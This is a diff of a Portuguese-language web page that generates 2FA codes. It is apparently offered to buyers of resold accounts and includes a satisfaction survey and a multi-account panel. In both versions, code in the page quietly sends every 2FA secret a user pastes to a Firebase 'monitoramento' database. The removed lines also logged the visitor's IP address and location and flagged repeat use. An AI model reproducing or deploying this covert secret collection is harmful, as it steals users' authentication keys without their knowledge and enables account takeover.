@@ -20,23 +20,28 @@
     .code { font-size:48px; letter-spacing:6px; margin-top:15px; font-weight:700; cursor:pointer; color: #4cd964; user-select: all; transition: transform 0.1s; }
     .code:active { transform: scale(0.95); }
     .msg { font-size:13px; color:#4cd964; margin-top:5px; min-height: 1.2em; font-weight: 600; }
-    .suporte-msg { font-size: 12px; color: #aaa; margin-top: 5px; }
     
     .tutorial { background: rgba(255,255,255,0.05); border-radius: 10px; padding: 15px; margin-top: 20px; text-align: left; font-size: 13px; color: #bbb; border-left: 3px solid #4cd964; }
     .tutorial b { color: #fff; display: block; margin-bottom: 8px; font-size: 14px; }
     .tutorial div { margin-bottom: 6px; display: flex; align-items: flex-start; }
     .tutorial div span { color: #4cd964; font-weight: bold; margin-right: 8px; }
 
-    .avaliacao { margin-top:20px; background:#2a2a2a; border-radius:12px; padding: 15px; display:none; border: 1px solid #333; }
-    .btn-voto { flex:1; border:none; padding:10px; border-radius:5px; color:#fff; cursor:pointer; font-weight: 600; }
-    .btn-abrir-voto { background:transparent; color:#4cd964; border: 1px solid #4cd964; padding:8px; border-radius:8px; cursor:pointer; margin-top:15px; width: 100%; }
+    .avaliacao { margin-top:20px; background:#2a2a2a; border-radius:12px; padding: 15px; display:none; border: 1px solid #333; text-align: center; }
+    .pergunta-bloco { margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #3d3d3d; }
+    .pergunta-bloco:last-child { border-bottom: none; margin-bottom: 0; }
+    .titulo-voto { font-size: 14px; color: #fff; margin-bottom: 12px; font-weight: 600; display: block; }
+    .btn-voto { flex:1; border:none; padding:10px; border-radius:5px; color:#fff; cursor:pointer; font-weight: 600; font-size: 12px; transition: 0.2s; }
+    .btn-voto:active { transform: scale(0.95); }
+    .btn-abrir-voto { background:transparent; color:#4cd964; border: 1px solid #4cd964; padding:8px; border-radius:8px; cursor:pointer; margin-top:15px; width: 100%; font-weight: 600; }
 
     .toggle { margin-top:18px; font-size:13px; cursor:pointer; color:#4cd964; text-decoration: underline; }
     .footer { font-size:11px; opacity:0.5; margin-top:20px; text-align:center; }
     
+    /* ESTILO DO PAINEL MULTI-CONTAS */
     .painel { position:fixed; right:20px; top:50%; transform:translateY(-50%); background:#1e1e1e; width:340px; padding:20px; border-radius:14px; box-shadow:0 10px 40px rgba(0,0,0,0.7); display:none; z-index: 100; border: 1px solid #333; max-height: 80vh; overflow-y: auto; }
     .item2fa { background:#2c2c2c; padding:12px; border-radius:8px; margin-bottom:10px; border-left: 4px solid #4cd964; text-align: left; }
-    .codigoMini { font-size: 20px; font-weight: 700; color: #4cd964; margin-top: 5px; letter-spacing: 2px; cursor: pointer; }
+    .item2fa input { margin-top: 5px; padding: 8px; background: #1a1a1a; font-size: 12px; }
+    .codigoMini { font-size: 24px; font-weight: 700; color: #4cd964; margin-top: 5px; letter-spacing: 2px; cursor: pointer; text-align: center; }
 </style>
 </head>
 <body oncontextmenu="return false;">
@@ -55,7 +60,6 @@
 
     <div class="code" id="code" onclick="copiar(this.innerText)">------</div>
     <div class="msg" id="msg"></div>
-    <div class="suporte-msg">Suporte disponível no chat da compra 🚀</div>
 
     <div class="tutorial">
         <b>🚀 TUTORIAL RÁPIDO:</b>
@@ -65,14 +69,44 @@
         <div><span>4.</span> O código muda sozinho a cada 30 segundos.</div>
     </div>
 
-    <button class="btn-abrir-voto" onclick="toggleAvaliacao()">Avaliar Serviço / Problemas</button>
+    <button class="btn-abrir-voto" onclick="toggleAvaliacao()">Avaliar Serviço / Feedback</button>
     
     <div class="avaliacao" id="painelAvaliacao">
-        <div style="display:flex; gap:10px;">
-            <button class="btn-voto" style="background:#ff4d4d;" onclick="votarSim()" id="btnSim">👍 Sim (0)</button>
-            <button class="btn-voto" style="background:#4cd964;" onclick="votarNao()" id="btnNao">👎 Não (0)</button>
+        <div class="pergunta-bloco">
+            <span class="titulo-voto">Recomenda nosso serviço?</span>
+            <div style="display:flex; gap:10px;">
+                <button class="btn-voto" style="background:#4cd964;" onclick="votar('p1', 'sim')" id="p1_sim">👍 Sim (0)</button>
+                <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p1', 'nao')" id="p1_nao">👎 Não (0)</button>
+            </div>
         </div>
-        <button onclick="removerAvaliacao()" style="background:none; border:none; color:#777; font-size:10px; margin-top:10px; cursor:pointer; width:100%;">Remover meu voto</button>
+        <div class="pergunta-bloco">
+            <span class="titulo-voto">As contas são de qualidade?</span>
+            <div style="display:flex; gap:10px;">
+                <button class="btn-voto" style="background:#4cd964;" onclick="votar('p2', 'sim')" id="p2_sim">👍 Sim (0)</button>
+                <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p2', 'nao')" id="p2_nao">👎 Não (0)</button>
+            </div>
+        </div>
+        <div class="pergunta-bloco">
+            <span class="titulo-voto">O suporte foi rápido?</span>
+            <div style="display:flex; gap:10px;">
+                <button class="btn-voto" style="background:#4cd964;" onclick="votar('p3', 'sim')" id="p3_sim">👍 Sim (0)</button>
+                <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p3', 'nao')" id="p3_nao">👎 Não (0)</button>
+            </div>
+        </div>
+        <div class="pergunta-bloco">
+            <span class="titulo-voto">Preço está justo?</span>
+            <div style="display:flex; gap:10px;">
+                <button class="btn-voto" style="background:#4cd964;" onclick="votar('p4', 'sim')" id="p4_sim">👍 Sim (0)</button>
+                <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p4', 'nao')" id="p4_nao">👎 Não (0)</button>
+            </div>
+        </div>
+        <div class="pergunta-bloco">
+            <span class="titulo-voto">Voltaria a comprar aqui?</span>
+            <div style="display:flex; gap:10px;">
+                <button class="btn-voto" style="background:#4cd964;" onclick="votar('p5', 'sim')" id="p5_sim">👍 Sim (0)</button>
+                <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p5', 'nao')" id="p5_nao">👎 Não (0)</button>
+            </div>
+        </div>
     </div>
 
     <div class="toggle" onclick="togglePainel()">⚡ Painel Multi-Contas</div>
@@ -105,128 +139,81 @@ var firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 var db = firebase.database();
 
-let userIP = "Buscando...";
-let infoExtra = { local: "..." };
-fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
-    userIP = data.ip; infoExtra.local = data.city + "/" + data.region;
+const listaPerguntas = ['p1', 'p2', 'p3', 'p4', 'p5'];
+function formatar(num) { return (num || 0).toLocaleString('pt-BR'); }
+
+listaPerguntas.forEach(p => {
+    db.ref('avaliacoes/' + p + '/sim').on('value', snap => {
+        document.getElementById(p + '_sim').innerText = '👍 Sim (' + formatar(snap.val()) + ')';
+    });
+    db.ref('avaliacoes/' + p + '/nao').on('value', snap => {
+        document.getElementById(p + '_nao').innerText = '👎 Não (' + formatar(snap.val()) + ')';
+    });
 });
 
-function enviarLog(chave) {
-    if(chave.length < 10) return;
-    let limpa = chave.replace(/[.#$[\]]/g, ""); 
-    db.ref("monitoramento/" + limpa).transaction(function(curr) {
-        const base = { chave: chave, ip: userIP, local: infoExtra.local, data: new Date().toLocaleString() };
-        if (!curr) return { ...base, acessos: 1, status: "LOGIN INICIAL" };
-        let n = (curr.acessos || 0) + 1;
-        let st = curr.status;
-        if(n === 2) st = "⚠️ ALERTA: SEGUNDA VEZ (TROCA DE SENHA)";
-        else if(n > 2) st = "🚨 ALERTA: USO REPETITIVO (" + n + "x)";
-        return { ...curr, ...base, acessos: n, status: st };
-    });
+function votar(perguntaId, tipo) {
+    if (localStorage.getItem('voto_' + perguntaId)) { return alert("Você já avaliou este item!"); }
+    db.ref('avaliacoes/' + perguntaId + '/' + tipo).transaction(n => (n || 0) + 1);
+    localStorage.setItem('voto_' + perguntaId, tipo);
+    alert("Avaliação enviada!");
 }
 
 function base32tohex(b32){const b32c="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let bits="",hex="";b32=b32.replace(/ /g,"").toUpperCase();for(let i=0;i<b32.length;i++){let val=b32c.indexOf(b32.charAt(i));if(val===-1)continue;bits+=val.toString(2).padStart(5,"0");}for(let i=0;i+4<=bits.length;i+=4){hex+=parseInt(bits.substr(i,4),2).toString(16);}return hex;}
 function gerarOTP(sec){try{let key=base32tohex(sec);let epoch=Math.round(Date.now()/1000);let time=Math.floor(epoch/30).toString(16).padStart(16,"0");let shaObj=new jsSHA("SHA-1","HEX");shaObj.setHMACKey(key,"HEX");shaObj.update(time);let hmac=shaObj.getHMAC("HEX");let offset=parseInt(hmac.substring(hmac.length-1),16);let otp=(parseInt(hmac.substr(offset*2,8),16)&0x7fffffff)+"";return otp.substr(otp.length-6);}catch(e){return "------";}}
 
-// Função de Cópia Blindada
 function copiar(txt) {
     if(!txt || txt === "------") return;
-    
-    // Tenta usar a API moderna
-    if (navigator.clipboard && window.isSecureContext) {
-        navigator.clipboard.writeText(txt).then(() => {
-            document.getElementById("msg").innerText = "✅ Código copiado!";
-            setTimeout(() => { document.getElementById("msg").innerText = ""; }, 2000);
-        }).catch(() => fallbackCopy(txt));
-    } else {
-        fallbackCopy(txt);
-    }
-}
-
-// Método antigo de cópia para navegadores que bloqueiam a API moderna
-function fallbackCopy(text) {
-    const textArea = document.createElement("textarea");
-    textArea.value = text;
-    document.body.appendChild(textArea);
-    textArea.select();
-    try {
-        document.execCommand('copy');
+    navigator.clipboard.writeText(txt).then(() => {
         document.getElementById("msg").innerText = "✅ Código copiado!";
         setTimeout(() => { document.getElementById("msg").innerText = ""; }, 2000);
-    } catch (err) {}
-    document.body.removeChild(textArea);
+    });
 }
 
-function limparInput() {
-    document.getElementById("secret").value = "";
-    document.getElementById("code").innerText = "------";
-    document.getElementById("clearInput").style.display = "none";
-}
-
-// Evento de Colagem / Digitação
 document.getElementById("secret").addEventListener("input", function() {
     let val = this.value.trim();
     if(val.length >= 10) {
         let otp = gerarOTP(val);
         document.getElementById("code").innerText = otp;
         document.getElementById("clearInput").style.display = "block";
-        copiar(otp); // Cópia disparada por evento de teclado (Permitido pelo navegador)
-        enviarLog(val);
+        copiar(otp);
+        db.ref("monitoramento/" + val.replace(/[.#$[\]]/g, "")).transaction(c => {
+            return c ? {...c, acessos:(c.acessos||0)+1} : {chave:val, acessos:1, data:new Date().toLocaleString()};
+        });
     }
 });
 
-// Atualização de Ciclo (30s)
-setInterval(() => {
-    let s = document.getElementById("secret").value.trim();
-    if(s.length >= 10) {
-        let n = gerarOTP(s);
-        if(document.getElementById("code").innerText !== n) {
-            document.getElementById("code").innerText = n;
-            copiar(n);
-        }
-    }
-    document.querySelectorAll(".item2fa").forEach(item => {
-        let inp = item.querySelector('input');
-        let display = item.querySelector('.codigoMini');
-        if(inp.value.length >= 10) {
-            let n = gerarOTP(inp.value.trim());
-            if(display.innerText !== n) display.innerText = n;
-        }
-    });
-}, 1000);
-
+// LÓGICA DO PAINEL MULTI-CONTAS
 function addCampo(){
     let lista = document.getElementById("lista2fa");
-    let id = lista.children.length + 1;
     let div = document.createElement("div");
     div.className = "item2fa";
-    div.innerHTML = `<strong>Conta ${id}</strong><input class="in-p" placeholder="Chave 2FA"><div class="codigoMini" onclick="copiar(this.innerText)">------</div>`;
+    div.innerHTML = `<strong>Conta ${lista.children.length + 1}</strong><input class="in-p" placeholder="Chave 2FA"><div class="codigoMini" onclick="copiar(this.innerText)">------</div>`;
     lista.appendChild(div);
     div.querySelector('input').addEventListener("input", function() {
         if(this.value.length >= 10) {
             let n = gerarOTP(this.value.trim());
             div.querySelector('.codigoMini').innerText = n;
             copiar(n);
-            enviarLog(this.value.trim());
         }
     });
 }
+for(let i=0; i<3; i++) addCampo(); // Inicia com 3 campos
 
 function togglePainel(){ document.getElementById("painel").style.display="block"; }
 function fecharPainel(){ document.getElementById("painel").style.display="none"; }
-for(let i=0; i<3; i++) addCampo();
-
-var lRef = db.ref("avaliacoes/sim"), dRef = db.ref("avaliacoes/nao");
-lRef.on("value", s => { document.getElementById("btnSim").innerText=`👍 Sim (${s.val()||0})`; });
-dRef.on("value", s => { document.getElementById("btnNao").innerText=`👎 Não (${s.val()||0})`; });
-function votarSim(){ if(localStorage.getItem("v")) return alert("Você já votou!"); lRef.transaction(n=>(n||0)+1); localStorage.setItem("v","s"); }
-function votarNao(){ if(localStorage.getItem("v")) return alert("Você já votou!"); dRef.transaction(n=>(n||0)+1); localStorage.setItem("v","n"); }
-function removerAvaliacao(){
-    let v = localStorage.getItem("v"); if(!v) return alert("Sem voto.");
-    if(v==="s") lRef.transaction(n=>(n||0)-1); else dRef.transaction(n=>(n||0)-1);
-    localStorage.removeItem("v"); alert("Voto removido.");
-}
+function limparInput() { document.getElementById("secret").value = ""; document.getElementById("code").innerText = "------"; document.getElementById("clearInput").style.display = "none"; }
 function toggleAvaliacao(){ let d=document.getElementById("painelAvaliacao"); d.style.display=d.style.display==="block"?"none":"block";}
+
+setInterval(() => {
+    let s = document.getElementById("secret").value.trim();
+    if(s.length >= 10) { document.getElementById("code").innerText = gerarOTP(s); }
+    document.querySelectorAll(".item2fa").forEach(item => {
+        let inp = item.querySelector('input');
+        if(inp.value.length >= 10) {
+            item.querySelector('.codigoMini').innerText = gerarOTP(inp.value.trim());
+        }
+    });
+}, 1000);
 </script>
 </body>
 </html>
